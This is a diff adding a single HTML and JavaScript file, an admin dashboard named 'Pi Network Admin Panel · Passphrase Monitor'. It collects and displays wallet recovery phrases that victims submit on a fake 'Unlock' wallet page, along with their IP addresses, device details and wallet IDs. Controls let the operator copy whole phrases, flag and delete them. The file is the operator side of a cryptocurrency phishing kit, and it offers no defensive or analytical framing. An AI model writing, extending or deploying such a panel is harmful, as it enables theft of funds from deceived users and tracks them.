@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Pi Network Admin Panel</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"/>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #f4f6fb;
+    color: #1f2937;
+    min-height: 100vh;
+  }
+
+  /* ---------- LOGIN ---------- */
+  #loginWrap {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: linear-gradient(135deg, #783A8D 0%, #4b1e5c 100%);
+    padding: 20px;
+  }
+  .login-card {
+    background: #fff;
+    padding: 40px 36px;
+    border-radius: 18px;
+    box-shadow: 0 25px 60px rgba(0,0,0,0.25);
+    width: 100%;
+    max-width: 420px;
+  }
+  .login-logo {
+    text-align: center;
+    margin-bottom: 28px;
+  }
+  .login-logo h1 {
+    color: #783A8D;
+    font-size: 26px;
+    font-weight: 700;
+    margin-top: 10px;
+  }
+  .login-logo p {
+    color: #6b7280;
+    font-size: 13px;
+    margin-top: 4px;
+  }
+  .field { margin-bottom: 18px; }
+  .field label {
+    display: block;
+    font-size: 13px;
+    font-weight: 600;
+    color: #374151;
+    margin-bottom: 6px;
+  }
+  .field input {
+    width: 100%;
+    padding: 13px 15px;
+    border: 1.5px solid #e5e7eb;
+    border-radius: 10px;
+    font-size: 14px;
+    font-family: inherit;
+    transition: all 0.2s;
+    outline: none;
+  }
+  .field input:focus {
+    border-color: #783A8D;
+    box-shadow: 0 0 0 3px rgba(120,58,141,0.12);
+  }
+  .login-btn {
+    width: 100%;
+    padding: 14px;
+    background: linear-gradient(135deg, #783A8D, #4b1e5c);
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    font-size: 14px;
+    font-weight: 600;
+    font-family: inherit;
+    cursor: pointer;
+    transition: transform 0.15s, box-shadow 0.2s;
+    letter-spacing: 0.5px;
+  }
+  .login-btn:hover:not(:disabled) {
+    transform: translateY(-1px);
+    box-shadow: 0 10px 20px rgba(120,58,141,0.35);
+  }
+  .login-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+  .err {
+    background: #fee2e2;
+    color: #b91c1c;
+    padding: 10px 12px;
+    border-radius: 8px;
+    font-size: 13px;
+    margin-bottom: 16px;
+    display: none;
+  }
+  .err.show { display: block; }
+
+  /* ---------- DASHBOARD ---------- */
+  #dashWrap { display: none; }
+
+  .topbar {
+    background: #fff;
+    border-bottom: 1px solid #e5e7eb;
+    padding: 14px 28px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+    position: sticky;
+    top: 0;
+    z-index: 50;
+  }
+  .brand { display: flex; align-items: center; gap: 12px; }
+  .brand-badge {
+    width: 40px;
+    height: 40px;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #783A8D, #4b1e5c);
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: 18px;
+  }
+  .brand h2 {
+    font-size: 18px;
+    color: #1f2937;
+    font-weight: 600;
+  }
+  .brand span {
+    font-size: 12px;
+    color: #6b7280;
+    display: block;
+  }
+  .topbar-actions { display: flex; align-items: center; gap: 12px; }
+  .icon-btn {
+    padding: 9px 14px;
+    border-radius: 8px;
+    border: 1px solid #e5e7eb;
+    background: #fff;
+    color: #374151;
+    font-size: 13px;
+    font-family: inherit;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-weight: 500;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .icon-btn:hover {
+    background: #f9fafb;
+    border-color: #d1d5db;
+  }
+  .icon-btn.danger {
+    background: #fef2f2;
+    border-color: #fecaca;
+    color: #b91c1c;
+  }
+  .icon-btn.danger:hover {
+    background: #fee2e2;
+  }
+
+  .main {
+    padding: 28px;
+    max-width: 1440px;
+    margin: 0 auto;
+  }
+
+  .stats-row {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 18px;
+    margin-bottom: 26px;
+  }
+  .stat-card {
+    background: #fff;
+    padding: 22px;
+    border-radius: 14px;
+    border: 1px solid #e5e7eb;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.03);
+  }
+  .stat-card .label {
+    font-size: 12px;
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    color: #6b7280;
+    font-weight: 500;
+  }
+  .stat-card .value {
+    font-size: 30px;
+    font-weight: 700;
+    margin-top: 8px;
+    color: #1f2937;
+  }
+  .stat-card.purple .value { color: #783A8D; }
+  .stat-card.green .value { color: #059669; }
+  .stat-card.amber .value { color: #d97706; }
+
+  .toolbar {
+    background: #fff;
+    border: 1px solid #e5e7eb;
+    border-radius: 14px 14px 0 0;
+    padding: 14px 18px;
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: 12px;
+    border-bottom: none;
+  }
+  .search {
+    flex: 1;
+    min-width: 240px;
+    position: relative;
+  }
+  .search input {
+    width: 100%;
+    padding: 10px 14px 10px 40px;
+    border: 1.5px solid #e5e7eb;
+    border-radius: 10px;
+    font-family: inherit;
+    font-size: 14px;
+    outline: none;
+    transition: all 0.2s;
+  }
+  .search input:focus {
+    border-color: #783A8D;
+    box-shadow: 0 0 0 3px rgba(120,58,141,0.1);
+  }
+  .search::before {
+    content: '🔍';
+    position: absolute;
+    left: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 14px;
+    opacity: 0.55;
+  }
+  .pill {
+    padding: 8px 12px;
+    border-radius: 8px;
+    border: 1px solid #e5e7eb;
+    background: #fff;
+    color: #374151;
+    font-size: 12px;
+    font-weight: 500;
+    cursor: pointer;
+    font-family: inherit;
+  }
+  .pill.active {
+    background: #783A8D;
+    color: #fff;
+    border-color: #783A8D;
+  }
+
+  .table-wrap {
+    background: #fff;
+    border: 1px solid #e5e7eb;
+    border-radius: 0 0 14px 14px;
+    overflow-x: auto;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13px;
+  }
+  thead {
+    background: #f9fafb;
+  }
+  th {
+    text-align: left;
+    padding: 14px 16px;
+    color: #6b7280;
+    font-weight: 600;
+    font-size: 12px;
+    text-transform: uppercase;
+    letter-spacing: 0.6px;
+    border-bottom: 1px solid #e5e7eb;
+    white-space: nowrap;
+  }
+  td {
+    padding: 14px 16px;
+    border-bottom: 1px solid #f3f4f6;
+    vertical-align: top;
+  }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: #fafbff; }
+
+  .words-cell {
+    max-width: 420px;
+  }
+  .words-preview {
+    color: #111827;
+    font-family: 'Consolas', 'Monaco', monospace;
+    font-size: 12px;
+    line-height: 1.6;
+  }
+  .words-preview.collapsed {
+    max-height: 3.2em;
+    overflow: hidden;
+    opacity: 0.75;
+  }
+  .wc-tag {
+    display: inline-block;
+    padding: 2px 8px;
+    border-radius: 999px;
+    font-size: 11px;
+    font-weight: 600;
+    margin-left: 8px;
+  }
+  .wc-24 { background: #d1fae5; color: #065f46; }
+  .wc-12 { background: #fef3c7; color: #92400e; }
+  .wc-other { background: #fee2e2; color: #991b1b; }
+
+  .badge {
+    display: inline-block;
+    padding: 2px 8px;
+    border-radius: 6px;
+    font-size: 11px;
+    font-weight: 600;
+  }
+  .badge.flagged { background: #fee2e2; color: #b91c1c; }
+  .badge.viewed { background: #dbeafe; color: #1e40af; }
+  .badge.new { background: #d1fae5; color: #065f46; }
+
+  .ip-cell {
+    font-family: 'Consolas', monospace;
+    font-size: 12px;
+    color: #374151;
+  }
+  .ua-cell {
+    font-size: 11px;
+    color: #6b7280;
+    max-width: 260px;
+    line-height: 1.4;
+  }
+  .time-cell {
+    font-size: 12px;
+    color: #4b5563;
+    white-space: nowrap;
+  }
+
+  .row-actions {
+    display: flex;
+    gap: 6px;
+    flex-wrap: wrap;
+  }
+  .mini {
+    padding: 5px 9px;
+    border-radius: 6px;
+    border: 1px solid #e5e7eb;
+    background: #fff;
+    font-size: 11px;
+    cursor: pointer;
+    font-family: inherit;
+    font-weight: 500;
+    transition: all 0.15s;
+  }
+  .mini:hover { background: #f3f4f6; }
+  .mini.copy { color: #1d4ed8; border-color: #bfdbfe; background: #eff6ff; }
+  .mini.copy:hover { background: #dbeafe; }
+  .mini.flag { color: #b45309; border-color: #fde68a; background: #fffbeb; }
+  .mini.flag.active { background: #fde68a; color: #92400e; }
+  .mini.del { color: #b91c1c; border-color: #fecaca; background: #fef2f2; }
+  .mini.del:hover { background: #fee2e2; }
+
+  .empty {
+    text-align: center;
+    padding: 60px 20px;
+    color: #6b7280;
+  }
+  .empty h3 { font-size: 16px; margin-bottom: 6px; color: #374151; }
+  .empty p { font-size: 13px; }
+
+  /* Modal */
+  .modal-backdrop {
+    display: none;
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.55);
+    z-index: 100;
+    align-items: center; justify-content: center;
+    padding: 20px;
+  }
+  .modal-backdrop.show { display: flex; }
+  .modal {
+    background: #fff;
+    border-radius: 16px;
+    width: 100%;
+    max-width: 640px;
+    max-height: 85vh;
+    overflow-y: auto;
+    box-shadow: 0 30px 80px rgba(0,0,0,0.4);
+  }
+  .modal-head {
+    padding: 20px 24px;
+    border-bottom: 1px solid #e5e7eb;
+    display: flex; align-items: center; justify-content: space-between;
+  }
+  .modal-head h3 { font-size: 16px; color: #1f2937; }
+  .modal-close {
+    border: none; background: transparent;
+    font-size: 22px; cursor: pointer;
+    color: #6b7280; line-height: 1;
+  }
+  .modal-body { padding: 24px; }
+  .kv-row {
+    display: grid;
+    grid-template-columns: 130px 1fr;
+    gap: 12px;
+    padding: 10px 0;
+    border-bottom: 1px solid #f3f4f6;
+    font-size: 13px;
+  }
+  .kv-row:last-child { border-bottom: none; }
+  .kv-k { color: #6b7280; font-weight: 500; padding-top: 2px; }
+  .kv-v {
+    color: #1f2937;
+    word-break: break-all;
+    font-family: 'Consolas', 'Monaco', monospace;
+    line-height: 1.6;
+  }
+  .kv-v.normal {
+    font-family: 'Poppins', sans-serif;
+    word-break: break-word;
+  }
+
+  .toast {
+    position: fixed;
+    bottom: 28px;
+    right: 28px;
+    background: #111827;
+    color: #fff;
+    padding: 12px 18px;
+    border-radius: 10px;
+    font-size: 13px;
+    z-index: 200;
+    opacity: 0;
+    transform: translateY(20px);
+    transition: all 0.3s;
+    pointer-events: none;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+  }
+  .toast.show {
+    opacity: 1;
+    transform: translateY(0);
+  }
+  .toast.success { background: #059669; }
+  .toast.error { background: #dc2626; }
+
+  @media (max-width: 760px) {
+    .main { padding: 16px; }
+    th, td { padding: 10px 10px; font-size: 12px; }
+    .topbar { padding: 12px 16px; }
+    .kv-row { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ===================== LOGIN ===================== -->
+<div id="loginWrap">
+  <div class="login-card">
+    <div class="login-logo">
+      <div style="width:58px;height:58px;margin:0 auto;border-radius:50%;background:linear-gradient(135deg,#783A8D,#4b1e5c);color:#fff;display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:700;">π</div>
+      <h1>Admin Panel</h1>
+      <p>Pi Network · Passphrase Monitor</p>
+    </div>
+    <div class="err" id="loginErr">Invalid username or password</div>
+    <div class="field">
+      <label for="u">Username</label>
+      <input type="text" id="u" autocomplete="username" placeholder="admin"/>
+    </div>
+    <div class="field">
+      <label for="p">Password</label>
+      <input type="password" id="p" autocomplete="current-password" placeholder="Enter password"/>
+    </div>
+    <button class="login-btn" id="loginBtn" onclick="login()">SIGN IN</button>
+  </div>
+</div>
+
+<!-- ===================== DASHBOARD ===================== -->
+<div id="dashWrap">
+  <div class="topbar">
+    <div class="brand">
+      <div class="brand-badge">π</div>
+      <div>
+        <h2>Admin Dashboard</h2>
+        <span>Passphrase collection &amp; monitor</span>
+      </div>
+    </div>
+    <div class="topbar-actions">
+      <button class="icon-btn" onclick="loadAll(true)">↻ Refresh</button>
+      <button class="icon-btn danger" onclick="logout()">⎋ Logout</button>
+    </div>
+  </div>
+
+  <div class="main">
+    <div class="stats-row">
+      <div class="stat-card purple">
+        <div class="label">Total Submissions</div>
+        <div class="value" id="sTotal">—</div>
+      </div>
+      <div class="stat-card green">
+        <div class="label">24-Word Phrases</div>
+        <div class="value" id="s24">—</div>
+      </div>
+      <div class="stat-card amber">
+        <div class="label">Flagged</div>
+        <div class="value" id="sFlag">—</div>
+      </div>
+      <div class="stat-card">
+        <div class="label">New (unviewed)</div>
+        <div class="value" id="sNew">—</div>
+      </div>
+    </div>
+
+    <div class="toolbar">
+      <div class="search">
+        <input type="text" id="searchInput" placeholder="Search passphrase, IP, user agent..." oninput="render()"/>
+      </div>
+      <button class="pill active" data-filter="all" onclick="setFilter('all', this)">All</button>
+      <button class="pill" data-filter="24" onclick="setFilter('24', this)">24 words</button>
+      <button class="pill" data-filter="12" onclick="setFilter('12', this)">12 words</button>
+      <button class="pill" data-filter="flagged" onclick="setFilter('flagged', this)">🚩 Flagged</button>
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th style="width:60px">#</th>
+            <th style="min-width:340px">Passphrase</th>
+            <th>IP Address</th>
+            <th style="min-width:220px">User Agent / Device</th>
+            <th>Submitted</th>
+            <th>Status</th>
+            <th style="width:180px">Actions</th>
+          </tr>
+        </thead>
+        <tbody id="tbody"></tbody>
+      </table>
+      <div class="empty" id="emptyState" style="display:none">
+        <h3>📭 No passphrases yet</h3>
+        <p>Submissions will appear here as users click Unlock on the wallet page.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ===================== DETAIL MODAL ===================== -->
+<div class="modal-backdrop" id="modal">
+  <div class="modal">
+    <div class="modal-head">
+      <h3>Submission Details</h3>
+      <button class="modal-close" onclick="closeModal()">×</button>
+    </div>
+    <div class="modal-body" id="modalBody"></div>
+  </div>
+</div>
+
+<div class="toast" id="toast">Copied!</div>
+
+<script>
+const TOKEN_KEY = 'pi_admin_token';
+let allRecords = [];
+let currentFilter = 'all';
+let loadPromise = null;
+
+/* ---------- AUTH ---------- */
+function getToken() { return localStorage.getItem(TOKEN_KEY); }
+function setToken(t) { localStorage.setItem(TOKEN_KEY, t); }
+function clearToken() { localStorage.removeItem(TOKEN_KEY); }
+
+function showDashboard() {
+  document.getElementById('loginWrap').style.display = 'none';
+  document.getElementById('dashWrap').style.display = 'block';
+  loadAll();
+}
+
+function showLogin() {
+  document.getElementById('loginWrap').style.display = 'flex';
+  document.getElementById('dashWrap').style.display = 'none';
+}
+
+async function login() {
+  const u = document.getElementById('u').value.trim();
+  const p = document.getElementById('p').value;
+  const btn = document.getElementById('loginBtn');
+  const err = document.getElementById('loginErr');
+  err.classList.remove('show');
+  if (!u || !p) { err.classList.add('show'); return; }
+
+  btn.disabled = true; btn.textContent = 'Signing in...';
+  try {
+    const r = await fetch('/api/admin/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: u, password: p })
+    });
+    const data = await r.json();
+    if (r.ok && data.token) {
+      setToken(data.token);
+      showDashboard();
+    } else {
+      err.classList.add('show');
+    }
+  } catch (e) {
+    err.classList.add('show');
+  }
+  btn.disabled = false; btn.textContent = 'SIGN IN';
+}
+
+async function logout() {
+  try {
+    await fetch('/api/admin/logout', {
+      method: 'POST',
+      headers: { 'x-admin-token': getToken() || '' }
+    });
+  } catch(_) {}
+  clearToken();
+  showLogin();
+}
+
+/* ---------- API HELPERS ---------- */
+async function api(path, opts = {}) {
+  const res = await fetch(path, {
+    ...opts,
+    headers: {
+      'Content-Type': 'application/json',
+      'x-admin-token': getToken() || '',
+      ...(opts.headers || {})
+    }
+  });
+  if (res.status === 401) {
+    clearToken();
+    showLogin();
+    throw new Error('Unauthorized');
+  }
+  return await res.json();
+}
+
+/* ---------- LOAD ---------- */
+async function loadAll(forceRefresh = false) {
+  if (!forceRefresh && loadPromise) return loadPromise;
+  loadPromise = (async () => {
+    try {
+      const [list, stats] = await Promise.all([
+        api('/api/admin/passphrases?limit=500'),
+        api('/api/admin/stats')
+      ]);
+      allRecords = list.records || [];
+      document.getElementById('sTotal').textContent = stats.total ?? 0;
+      document.getElementById('s24').textContent = allRecords.filter(r => r.wordCount === 24).length;
+      document.getElementById('sFlag').textContent = stats.flagged ?? 0;
+      document.getElementById('sNew').textContent = allRecords.filter(r => !r.viewed).length;
+      render();
+    } catch(e) {}
+  })();
+  return loadPromise;
+}
+
+/* ---------- RENDER ---------- */
+function setFilter(f, el) {
+  currentFilter = f;
+  document.querySelectorAll('.pill[data-filter]').forEach(p => p.classList.remove('active'));
+  if (el) el.classList.add('active');
+  render();
+}
+
+function applyFilterAndSearch(arr) {
+  const q = (document.getElementById('searchInput')?.value || '').toLowerCase().trim();
+  return arr.filter(r => {
+    if (currentFilter === '24' && r.wordCount !== 24) return false;
+    if (currentFilter === '12' && r.wordCount !== 12) return false;
+    if (currentFilter === 'flagged' && !r.flagged) return false;
+    if (q) {
+      const hay = (r.passphrase + ' ' + (r.ip||'') + ' ' + (r.userAgent||'')).toLowerCase();
+      if (!hay.includes(q)) return false;
+    }
+    return true;
+  });
+}
+
+function wcClass(n) {
+  if (n === 24) return 'wc-24';
+  if (n === 12) return 'wc-12';
+  return 'wc-other';
+}
+
+function fmtTime(s) {
+  if (!s) return '—';
+  try {
+    const d = new Date(s);
+    const diff = (Date.now() - d.getTime()) / 1000;
+    let rel;
+    if (diff < 60) rel = Math.floor(diff) + 's ago';
+    else if (diff < 3600) rel = Math.floor(diff/60) + 'm ago';
+    else if (diff < 86400) rel = Math.floor(diff/3600) + 'h ago';
+    else rel = Math.floor(diff/86400) + 'd ago';
+    return `${rel}<br><span style="font-size:11px;opacity:0.7">${d.toLocaleString()}</span>`;
+  } catch { return s; }
+}
+
+function truncateUA(s) {
+  if (!s) return '—';
+  const mobile = /iPhone|iPad|iPod|Android/i.test(s);
+  const os = s.match(/\(([^)]+)\)/)?.[1] || '';
+  const browser = (s.match(/(Chrome|Safari|Firefox|Edge)\/(\d+)/) || [])[1] || '';
+  return `<div>${mobile ? '📱' : '💻'} ${os.split(';')[0]}</div><div style="margin-top:4px;opacity:0.7">${browser ? browser : ''}</div>`;
+}
+
+function render() {
+  const tbody = document.getElementById('tbody');
+  const empty = document.getElementById('emptyState');
+  const filtered = applyFilterAndSearch(allRecords);
+
+  if (filtered.length === 0) {
+    tbody.innerHTML = '';
+    empty.style.display = 'block';
+    empty.querySelector('h3').textContent = allRecords.length === 0 ? '📭 No passphrases yet' : '🔍 No matching results';
+    return;
+  }
+  empty.style.display = 'none';
+
+  tbody.innerHTML = filtered.map((r, i) => {
+    const status = [];
+    if (r.flagged) status.push('<span class="badge flagged">🚩 Flagged</span>');
+    if (!r.viewed) status.push('<span class="badge new">🆕 New</span>');
+    else status.push('<span class="badge viewed">✓ Viewed</span>');
+
+    return `
+      <tr>
+        <td style="font-weight:600;color:#6b7280">#${i + 1}</td>
+        <td class="words-cell">
+          <span class="words-preview collapsed" id="w-${r.id}">${escapeHtml(r.passphrase)}</span>
+          <span class="wc-tag ${wcClass(r.wordCount)}">${r.wordCount} words</span>
+          <div style="margin-top:6px">
+            <a href="#" class="mini" onclick="toggleWords('${r.id}');return false;">👁 Expand/collapse</a>
+            <a href="#" class="mini" onclick="openDetails('${r.id}');return false;">More →</a>
+          </div>
+        </td>
+        <td class="ip-cell">${escapeHtml(r.ip || '—')}</td>
+        <td class="ua-cell">${truncateUA(r.userAgent)}</td>
+        <td class="time-cell">${fmtTime(r.createdAt)}</td>
+        <td>${status.join(' ')}</td>
+        <td>
+          <div class="row-actions">
+            <button class="mini copy" onclick="copyPassphrase('${r.id}')">📋 Copy</button>
+            <button class="mini flag ${r.flagged ? 'active' : ''}" onclick="toggleFlag('${r.id}', ${!r.flagged})">
+              ${r.flagged ? '🏴 Unflag' : '🚩 Flag'}
+            </button>
+            <button class="mini del" onclick="deleteRow('${r.id}')">🗑</button>
+          </div>
+        </td>
+      </tr>
+    `;
+  }).join('');
+}
+
+/* ---------- ACTIONS ---------- */
+function toggleWords(id) {
+  const el = document.getElementById('w-' + id);
+  if (el) el.classList.toggle('collapsed');
+}
+
+function escapeHtml(str) {
+  if (!str) return '';
+  return String(str)
+    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;').replace(/'/g, '&#039;');
+}
+
+function toast(msg, type='') {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast show ' + type;
+  setTimeout(() => { t.className = 'toast ' + type; }, 2200);
+}
+
+async function copyPassphrase(id) {
+  const r = allRecords.find(x => x.id === id);
+  if (!r) return;
+  try {
+    await navigator.clipboard.writeText(r.passphrase);
+    toast('Copied to clipboard!', 'success');
+  } catch {
+    const ta = document.createElement('textarea');
+    ta.value = r.passphrase;
+    document.body.appendChild(ta); ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    toast('Copied!', 'success');
+  }
+}
+
+async function toggleFlag(id, flagged) {
+  try {
+    await api('/api/admin/passphrases/' + id, {
+      method: 'PATCH',
+      body: JSON.stringify({ flagged })
+    });
+    const r = allRecords.find(x => x.id === id);
+    if (r) r.flagged = flagged;
+    toast(flagged ? 'Flagged' : 'Unflagged', 'success');
+    render();
+  } catch(e) {
+    toast('Failed', 'error');
+  }
+}
+
+async function deleteRow(id) {
+  if (!confirm('Delete this submission permanently?')) return;
+  try {
+    await api('/api/admin/passphrases/' + id, { method: 'DELETE' });
+    allRecords = allRecords.filter(x => x.id !== id);
+    toast('Deleted', 'success');
+    loadAll(true);
+  } catch(e) {
+    toast('Failed to delete', 'error');
+  }
+}
+
+/* ---------- DETAIL MODAL ---------- */
+function openDetails(id) {
+  const r = allRecords.find(x => x.id === id);
+  if (!r) return;
+  const body = document.getElementById('modalBody');
+  const words = (r.passphrase || '').split(/\s+/).filter(Boolean);
+  const grid = words.map((w, i) =>
+    `<span style="display:inline-block;padding:6px 10px;margin:3px;border-radius:6px;background:${i < 24 ? '#f3e8ff' : '#fef2f2'};border:1px solid ${i < 24 ? '#e9d5ff' : '#fecaca'};color:#1f2937;font-family:Consolas,monospace;font-size:12px;">${i+1}. ${escapeHtml(w)}</span>`
+  ).join('');
+
+  body.innerHTML = `
+    <div class="kv-row"><div class="kv-k">ID</div><div class="kv-v">${escapeHtml(r.id)}</div></div>
+    <div class="kv-row"><div class="kv-k">Word Count</div><div class="kv-v">${r.wordCount}</div></div>
+    <div class="kv-row">
+      <div class="kv-k">Passphrase (${words.length} words)</div>
+      <div class="kv-v normal">
+        ${grid}
+        <div style="margin-top:14px">
+          <button class="mini copy" onclick="copyPassphrase('${r.id}');closeModal()">📋 Copy All</button>
+        </div>
+      </div>
+    </div>
+    <div class="kv-row"><div class="kv-k">IP Address</div><div class="kv-v">${escapeHtml(r.ip || '—')}</div></div>
+    <div class="kv-row"><div class="kv-k">Submitted At</div><div class="kv-v normal">${r.createdAt ? new Date(r.createdAt).toLocaleString() : '—'}</div></div>
+    <div class="kv-row"><div class="kv-k">Wallet ID</div><div class="kv-v">${escapeHtml(r.walletId || '—')}</div></div>
+    <div class="kv-row"><div class="kv-k">Source Page</div><div class="kv-v normal">${escapeHtml(r.page || '—')}</div></div>
+    <div class="kv-row"><div class="kv-k">Viewed</div><div class="kv-v normal">${r.viewed ? 'Yes' : 'No'}</div></div>
+    <div class="kv-row"><div class="kv-k">Flagged</div><div class="kv-v normal">${r.flagged ? '🚩 Yes' : 'No'}</div></div>
+    <div class="kv-row">
+      <div class="kv-k">User Agent</div>
+      <div class="kv-v normal">${escapeHtml(r.userAgent || '—')}</div>
+    </div>
+  `;
+  document.getElementById('modal').classList.add('show');
+}
+
+function closeModal() {
+  document.getElementById('modal').classList.remove('show');
+}
+document.getElementById('modal').addEventListener('click', e => {
+  if (e.target.id === 'modal') closeModal();
+});
+
+/* ---------- BOOT ---------- */
+if (getToken()) {
+  showDashboard();
+} else {
+  showLogin();
+}
+
+document.getElementById('p').addEventListener('keydown', e => {
+  if (e.key === 'Enter') login();
+});
+document.getElementById('u').addEventListener('keydown', e => {
+  if (e.key === 'Enter') document.getElementById('p').focus();
+});
+</script>
+</body>
+</html>
